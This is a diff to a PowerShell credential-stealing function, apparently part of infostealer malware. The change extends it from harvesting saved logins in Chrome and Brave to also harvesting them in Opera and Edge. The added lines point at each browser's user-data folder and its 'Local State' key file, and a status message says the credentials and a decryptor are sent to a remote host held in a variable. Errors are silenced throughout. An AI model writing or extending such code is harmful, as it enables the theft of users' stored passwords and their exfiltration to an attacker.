@@ -4,7 +4,7 @@ function dcinfosnd {
     )
     $ErrorActionPreference = 'SilentlyContinue'
     
-    Write-Host "Starting credential retrieval for Chrome and Brave - Python decryptor will be prepared and sent to $hq"
+    Write-Host "Starting credential retrieval for Chrome, Brave, Opera and Edge - Python decryptor will be prepared and sent to $hq"
     Write-Host "======================================================================================"
     
     # Arrays to store all credentials with their associated keys
@@ -161,6 +161,16 @@ function dcinfosnd {
     $bravePath = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"
     $braveLocalState = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State"
     Process-Browser -browserName "brave" -userDataPath $bravePath -localStatePath $braveLocalState
+    
+    # Process Opera
+    $operaPath = "$env:APPDATA\Opera Software\Opera Stable"
+    $operaLocalState = "$env:APPDATA\Opera Software\Opera Stable\Local State"
+    Process-Browser -browserName "opera" -userDataPath $operaPath -localStatePath $operaLocalState
+    
+    # Process Edge
+    $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+    $edgeLocalState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+    Process-Browser -browserName "edge" -userDataPath $edgePath -localStatePath $edgeLocalState
     
     # Debug information
     Write-Host "Debug information:"
